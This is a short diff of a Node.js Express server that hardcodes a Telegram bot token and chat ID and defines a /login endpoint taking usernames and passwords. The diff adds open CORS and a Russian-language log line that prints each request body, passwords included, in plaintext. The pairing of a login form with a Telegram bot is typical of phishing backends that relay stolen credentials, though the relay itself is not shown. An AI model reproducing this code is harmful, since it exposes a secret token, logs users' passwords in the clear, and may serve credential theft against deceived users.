@@ -9,6 +9,7 @@ const fetch = require("node-fetch");
 
 const app = express();
 const port = 8080;
+app.use(cors());
 
 const TELEGRAM_BOT_TOKEN = "8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM";
 const CHAT_ID = 531918242;
@@ -31,6 +32,8 @@ app.get("/", (req, res) => {
 });
 
 app.post("/login", async (req, res) => {
+  console.log("Получен POST-запрос на /login:", req.body);
+
   const { username, password } = req.body;
   if (!username || !password) {
     return res.status(400).json({ error: "Missing username or password" });
